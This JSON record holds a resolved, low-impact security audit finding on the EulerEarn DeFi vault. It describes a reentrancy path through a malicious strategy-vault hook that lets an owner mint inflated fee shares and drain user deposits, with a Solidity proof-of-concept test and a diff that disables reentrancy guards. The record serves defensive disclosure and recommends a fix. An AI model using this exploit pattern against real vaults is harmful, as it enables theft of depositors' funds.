{
    "id": 62181,
    "kind": "MARKDOWN",
    "auditfirm_id": 16,
    "impact": "LOW",
    "finders_count": 1,
    "protocol_id": 3389,
    "title": "[L-08] Edge case allows owner to covertly steal assets from users",
    "content": "\n_Resolved_\n\n**Note**:\nThis attack is currently not possible, given that the initial supported strategy vaults compatible with `EulerEarn` will be restricted to `EulerEarn` vaults and EVK vaults. A strategy vault that would allow this exploit to occur could have the same functionality/logic as EVK vaults, however, it would *not* have read-only reentrancy protection (use `nonReentrantView` modifiers on view functions), as this is what is currently blocking this exploit with normal EVK vaults. This report assumes that such vaults could potentially be supported in the future.\n\nAnother major pre-condition of this exploit is that a soon-to-be malicious strategy vault is considered a verified strategy by the `perspective` contract. In this scenario, the vault can seem benign, but it will have to mask a malicious hook contract (can make the hook upgradeable or set a malicious hook directly before the attack). This strategy vault could *never* be given the ability to handle user assets and does not need to appear malicious to the `EulerEarn` vault up until the actual exploit, which can be executed in 1 transaction,  making this a viable long-tail attack that can lead to a loss of user funds. \n\nOnce the above pre-conditions are met, this exploit is possible due to:\n- `setFee` and `setFeeRecipient` do not have reentrancy protection.\n- `_withdraw` optimistically updating `lastTotalAssets` before external interactions with strategies.\n\nThe setup for this attack can be performed in stealth and can potentially go undetected by users since:\n- The `malVault` (malicious vault) will virtually always have a 0 cap set (reset to 0 immediately).\n- The `malVault` will never be added to the supply queue.\n- The `malVault` will be at the end of the withdrawal queue, and normal users will never interact with it.\n\n**Vulnerability Details**\n\nSuppose the `feeRecipient` calls `EulerEarn::withdraw`. The `_withdraw` function optimistically updates the `lastTotalAssets` storage variable, with a potentially invalid value, before interacting with strategy vaults:\n\n```solidity\n        _updateLastTotalAssets(lastTotalAssets.zeroFloorSub(assets)); // @audit: optimistically update state as if caller can withdraw all `assets` specified\n\n        _withdrawStrategy(assets); // @audit: then interact with external contracts\n\n        super._withdraw(caller, receiver, owner, assets, shares);\n```\n\nAfter updating `lastTotalAssets`, `EulerEarn` it then calls `withdraw` on the strategy vault:\n\n```solidity\n                try id.withdraw(toWithdraw, address(this), address(this)) returns (uint256 withdrawnShares) {\n```\n\nIf the strategy vault supports hooks, a malicious hook can then reenter `EulerEarn` to call the `setFee` function (hook must assume ownership first). `setFee` will then invoke `_accrueInterest`, which will calculate the interest accrued as the total assets held by trusted strategies minus the prematurely updated `lastTotalAssets`:\n\n```solidity\n        uint256 realTotalAssets;\n        for (uint256 i; i < withdrawQueue.length; ++i) {\n            IERC4626 id = withdrawQueue[i];\n            realTotalAssets += _expectedSupplyAssets(id);\n        }\n\n        uint256 lastTotalAssetsCached = lastTotalAssets;\n        if (realTotalAssets < lastTotalAssetsCached - lostAssets) {\n            // If the vault lost some assets (realTotalAssets decreased), lostAssets is increased.\n            newLostAssets = lastTotalAssetsCached - realTotalAssets;\n        } else {\n            // If it did not, lostAssets stays the same.\n            newLostAssets = lostAssets;\n        }\n\n        newTotalAssets = realTotalAssets + newLostAssets;\n        uint256 totalInterest = newTotalAssets - lastTotalAssetsCached;\n```\n\nSince no assets have yet left the strategies, this interest will be inflated, and as a result, fee shares will be minted to the `feeRecipient` (caller for the current `EulerEarn::withdraw` function). This allows the `feeRecipient` to withdrawal excess assets from `EulerEarn` by specifying a withdraw of `x' + y'` assets (which corresponds to `x + y` shares). At the beginning of the transaction they could only have `x` shares, which have claim to `x'` assets, but due to interest being accrued mid execution, the `feeRecipient` will have `x + y` (where `y` == fee shares minted) shares before the transaction ends, which will give them claim to `x' + y'` assets. \n\nThe POC attached showcases how the `feeRecipient` can leverage this exploit to drain the `EulerEarn` vault. \n\n**Exploit Steps (can skip to Proof Of Concept to observe steps in code)**\nHere are the steps a malicious owner can take to set up the exploit:\n\n0. Upon deployment of EulerEarn, set an initial timelock of 0 to immediately configure strategies.\n1. Owner supplies to `malVault` (1 wei of assets) on behalf of EulerEarn, minting shares for EulerEarn.\n2. Set valid caps for the trusted vault and set an initial cap of `1 wei` for the `malVault` (`malVault` will be added to the end of the withdraw queue).\n    - `malVault` will have a `> 0` internal balance configured due to the shares minted on their behalf in step 1:\n\n```solidity\n                marketConfig.enabled = true;\n                marketConfig.balance = id.balanceOf(address(this)).toUint112();\n```\n\n3. Add trusted strategies to the supply queue.\n4. Immediately set the cap of the `malVault` to 0.\n\nAt this point, the exploit is staged, and now the owner can perform normal operations, i.e. set a non zero timelock and allocate deposited assets to trusted vaults. The `malVault` is now at the end of the withdraw queue and has 0 cap, and it will remain dormant until the owner decides there are enough assets managed by the vault to initiate the exploit. Before the exploit is initiated, the `malVault` will have its hook contract upgraded to include the malicious logic.\n\nThe rest of the exploit can be executed in 1 transaction:\n1. Owner sets the `feeRecipient` as themselves and sets a max fee for `EulerEarn` vault.\n2. Owner deposits assets into EulerEarn as a fee recipient.\n3. Owner transfers ownership to `malVault`'s hook (2 step transfer, so `malVault` hook is pending owner now).\n4. Owner calls `updateWithdrawQueue` to move `malVault` to the front of the queue.\n5. Owner calls `EulerEarn::withdraw` and specifies all assets in `EulerEarn` vault. This triggers the malicious hook, which will first call `EulerEarn::acceptOwnership` and then `EulerEarn::setFee(0)` to trigger interest accrual.\n\n**Proof Of Concept**\n\nFirst, remove logic for `nonReentrantView` modifier in `lib/euler-vault-kit/src/EVault/shared/Base.sol` to simulate a strategy vault that does not provide this protection (note that interest accrual in `EulerEarn` will call `strategyVault::previewRedeem`, which will trigger read-only reentrancy for normal EVK vaults):\n\n```diff\ndiff --git a/./lib/euler-vault-kit/src/EVault/shared/Base.sol b/./lib/euler-vault-kit/src/EVault/shared/Base.sol\nindex 061d7b1..e72e5f7 100644\n--- a/./lib/euler-vault-kit/src/EVault/shared/Base.sol\n+++ b/./lib/euler-vault-kit/src/EVault/shared/Base.sol\n@@ -59,18 +59,18 @@ abstract contract Base is EVCClient, Cache {\n     }\n \n     modifier nonReentrantView() {\n-        if (vaultStorage.reentrancyLocked) {\n-            address hookTarget = vaultStorage.hookTarget;\n-\n-            // The hook target is allowed to bypass the RO-reentrancy lock. The hook target can either be a msg.sender\n-            // when the view function is inlined in the EVault.sol or the hook target should be taken from the trailing\n-            // data appended by the delegateToModuleView function used by useView modifier. In the latter case, it is\n-            // safe to consume the trailing data as we know we are inside useView because msg.sender == address(this)\n-            if (msg.sender != hookTarget && !(msg.sender == address(this) && ProxyUtils.useViewCaller() == hookTarget))\n-            {\n-                revert E_Reentrancy();\n-            }\n-        }\n+        // if (vaultStorage.reentrancyLocked) {\n+        //     address hookTarget = vaultStorage.hookTarget;\n+        //\n+        //     // The hook target is allowed to bypass the RO-reentrancy lock. The hook target can either be a msg.sender\n+        //     // when the view function is inlined in the EVault.sol or the hook target should be taken from the trailing\n+        //     // data appended by the delegateToModuleView function used by useView modifier. In the latter case, it is\n+        //     // safe to consume the trailing data as we know we are inside useView because msg.sender == address(this)\n+        //     if (msg.sender != hookTarget && !(msg.sender == address(this) && ProxyUtils.useViewCaller() == hookTarget))\n+        //     {\n+        //         revert E_Reentrancy();\n+        //     }\n+        // }\n         _;\n     }\n \n@@ -150,3 +150,4 @@ abstract contract Base is EVCClient, Cache {\n         );\n     }\n }\n+\n```\n\nSecond, add the following file to the test suite:\n\n```solidity\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity ^0.8.26;\n\nimport {stdError} from \"../lib/forge-std/src/StdError.sol\";\n\nimport {SafeCast} from \"../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol\";\nimport \"./helpers/IntegrationTest.sol\";\nimport {IHookTarget} from \"../lib/euler-vault-kit/src/interfaces/IHookTarget.sol\";\n\ncontract MalHook is IHookTarget {\n    IEulerEarn eulerEarn;\n\n    constructor(address _eulerEarn) {\n        eulerEarn = IEulerEarn(_eulerEarn);\n    }\n    function isHookTarget() external view returns (bytes4) {\n        return bytes4(0x87439e04); \n    }\n\n    function withdraw(uint256, address, address) external {\n        // hook accepts ownership for eulerEarn\n        eulerEarn.acceptOwnership();\n\n        // hook calls `setFee` on eulerEarn to trigger interest accrual and mint excess shares to the attacker\n        eulerEarn.setFee(0);\n    }\n}\n\ncontract HookReentrancyTest is IntegrationTest {\n    using MathLib for uint256;\n\n    function setUp() public override {\n        super.setUp();\n\n        _setCap(allMarkets[0], CAP);\n    }\n\n    function test_jcn_steal_assets() public {\n        // --- Set Up --- //\n\n        // Set 0 timelock on EulerEarn deployment\n        IEulerEarn eulerEarn = eeFactory.createEulerEarn(\n            OWNER, 0, address(loanToken), \"EulerEarn Vault\", \"EEV\", bytes32(uint256(1))\n        );\n\n        vm.startPrank(OWNER);\n        eulerEarn.setCurator(CURATOR);\n        eulerEarn.setIsAllocator(ALLOCATOR, true);\n        eulerEarn.setFeeRecipient(FEE_RECIPIENT);\n        vm.stopPrank();\n\n        // soon-to-be malicious vault deployed and verified\n        IEVault eVault;\n        eVault = IEVault(\n            factory.createProxy(address(0), true, abi.encodePacked(address(loanToken), address(oracle), unitOfAccount))\n        );\n\n        // hook for malVault updated to malicious hook \n        // Note: this can be done directly before exploit, but doing it here for simplicity of the test.\n        // In real world scenario the hook may not be updated or upgraded to include malicious logic until\n        // the attack is ready to be executed.\n        uint32 hookOps = OP_WITHDRAW;\n        address malHook = address(new MalHook(address(eulerEarn)));\n\n        eVault.setHookConfig(malHook, hookOps); \n\n        IERC4626 malVault = _toIERC4626(eVault);\n        perspective.perspectiveVerify(address(malVault));\n\n        // Supply to malVault on behalf of EulerEarn \n        address attacker = OWNER;\n        loanToken.mint(attacker, 1);\n\n        vm.startPrank(attacker);\n        loanToken.approve(address(malVault), 1);\n        malVault.deposit(1, address(eulerEarn));\n        vm.stopPrank();\n\n        // Set caps for all strategies (small, negligible cap for  malVault), malVault at end of withdrawQueue\n        vm.startPrank(CURATOR);\n        eulerEarn.submitCap(allMarkets[0], type(uint184).max);\n        eulerEarn.submitCap(malVault, 1);\n        eulerEarn.acceptCap(allMarkets[0]);\n        eulerEarn.acceptCap(malVault);\n        vm.stopPrank();\n\n        // Add trusted strategy to supply queue only\n        IERC4626[] memory supplyQueue = new IERC4626[](1);\n        supplyQueue[0] = allMarkets[0];\n\n        vm.startPrank(ALLOCATOR);\n        eulerEarn.setSupplyQueue(supplyQueue);\n        vm.stopPrank();\n\n        // Set cap of malVault to 0\n        vm.startPrank(CURATOR);\n        eulerEarn.submitCap(malVault, 0);\n        vm.stopPrank();\n\n        // user deposits into EulerEarn\n        uint256 depositAmount = 1000e18;\n        address user = address(0x010101);\n        loanToken.mint(user, depositAmount);\n\n        vm.startPrank(user);\n        loanToken.approve(address(eulerEarn), depositAmount);\n        eulerEarn.deposit(depositAmount, user);\n        vm.stopPrank();\n\n        // --- Execute Exploit --- //\n\n        // owner sets fee recipient and sets max fee\n        vm.startPrank(attacker);\n        eulerEarn.setFeeRecipient(attacker);\n        eulerEarn.setFee(0.5e18);\n\n        // owner deposits assets into eulerEarn\n        loanToken.mint(attacker, depositAmount); \n        loanToken.approve(address(eulerEarn), depositAmount);\n        eulerEarn.deposit(depositAmount, attacker);\n\n        // owner transfers ownership to malVault's hook\n        eulerEarn.transferOwnership(malHook);\n\n        // owner moves malVault to beginning of withdraw queue\n        uint256[] memory indexes = new uint256[](2);\n        indexes[0] = 1;\n        indexes[1] = 0;\n\n        eulerEarn.updateWithdrawQueue(indexes);\n\n        // owner withdraws all assets from EulerEarn\n        assertEq(loanToken.balanceOf(attacker), 0); // 0 balance before exploit\n\n        uint256 allAssets = eulerEarn.lastTotalAssets();\n\n        eulerEarn.withdraw(allAssets, attacker, attacker);\n\n        assertEq(loanToken.balanceOf(attacker), allAssets); // attacker stole all assets from EulerEarn\n        assertGt(eulerEarn.balanceOf(attacker), 0); // attacker still has excess shares\n    }\n}\n```\n\n**Recommendations**\n\nIt's recommended placing `nonReentrant` modifiers on `setFee` and `setFeeRecipient` to protect against this edge case.\n\n\n\n",
    "summary": "",
    "report_date": "2025-08-27T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/pashov/audits/blob/master/team/md/EulerEarn-security-review_2025-07-25.md",
    "github_link": "",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "",
    "slug": "l-08-edge-case-allows-owner-to-covertly-steal-assets-from-users-pashov-audit-group-none-eulerearn_2025-07-25-markdown",
    "firm_name": "Pashov Audit Group",
    "firm_logo_square": "Pashov_square.png",
    "protocol_name": "EulerEarn_2025-07-25",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Pashov Audit Group"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Pashov Audit Group",
        "logo_square": "Pashov_square.png"
    },
    "protocols_protocol": {
        "name": "EulerEarn_2025-07-25",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}